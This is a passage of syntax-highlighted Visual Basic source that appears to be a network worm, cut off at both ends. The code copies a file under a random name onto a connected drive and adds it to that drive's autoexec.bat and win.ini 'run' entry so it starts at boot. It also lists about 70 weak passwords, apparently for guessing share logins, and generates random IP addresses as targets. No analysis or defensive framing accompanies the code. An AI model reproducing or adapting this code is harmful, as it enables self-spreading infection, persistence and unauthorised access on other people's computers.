</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dW</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc7">R</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RndName</span><span class="sc0">

</span><span class="sc7">FileCopy</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\autoexec.bat"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\autoexec.bat"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">n</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FrFile</span><span class="sc0">
 </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\autoexec.bat"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Append</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#n
</span><span class="sc0"> </span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc9">#n, vbCrLf &amp; "@win \" &amp; R
</span><span class="sc0"> </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#n
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">dW</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbDirectory</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbSystem</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbHidden</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbReadOnly</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">dW</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">dW</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"win"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

  </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">dW</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

  </span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">dW</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\win.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc7">WIni</span><span class="sc0"> </span><span class="sc4">"windows"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"run"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">R</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">dW</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\win.ini"</span><span class="sc0">

  </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">dW</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">

</span><span class="sc7">DeConecIp</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">vL</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Cred</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"%null%"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"%username%"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"%username%12"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"%username%123"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"%username%1234"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"123"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"1234"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"12345"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"123456"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"1234567"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"12345678"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">12</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"654321"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"54321"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">14</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"111"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"11111"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">17</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"111111"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">18</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"11111111"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">19</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"000000"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">20</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"00000000"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">21</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"pass"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">22</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"5201314"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">23</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"88888888"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">24</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"888888"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">25</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"passwd"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">26</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"password"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">27</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"sql"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">28</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"database"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">29</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"admin"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">30</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"test"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">31</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"server"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">32</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"computer"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">33</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"secret"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">34</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"oracle"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">35</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"sybase"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">36</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"root"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">37</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Internet"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">38</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"super"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">39</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"user"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">40</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"manager"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">41</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"security"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">42</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"public"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">43</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"private"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">44</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"default"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">45</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"1234qwer"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">46</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"123qwe"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">47</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"abcd"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">48</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"abc123"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">53</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"123abc"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">54</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"abc"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">55</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"123asd"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">56</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"asdf"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">57</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"asdfgh"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">58</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">59</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$%"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">60</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$%^"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">61</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$%^&amp;"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">62</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$%^&amp;*"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">63</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$%^&amp;*("</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">64</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"!@#$%^&amp;*()"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">65</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"intel"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">66</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">67</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">68</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"KKKKKKK"</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">69</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"09876"</span><span class="sc0">
</span><span class="sc7">U</span><span class="sc6">(</span><span class="sc2">70</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Cred</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">U</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GLD</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">NextGLD</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">gL</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc0">
</span><span class="sc7">gL</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">71</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Fdx</span><span class="sc6">(</span><span class="sc7">gL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":\"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">NextGLD</span><span class="sc0">
</span><span class="sc7">GLD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetRndIP</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc0">

</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc7">rIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">GetRndIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetRndIP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"."</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">rIP</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">GetRndIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">GetRndIP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetLclIP</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">StartWinsock</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EndWinsock</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hostname</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostip_addr</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">temp_ip_address</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ip_address</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">gethostname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">hostname</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim$</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">hostent_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">hostent_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_addr</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">LenB</span><span class="sc6">(</span><span class="sc7">Host</span><span class="sc6">)</span><span class="sc0">

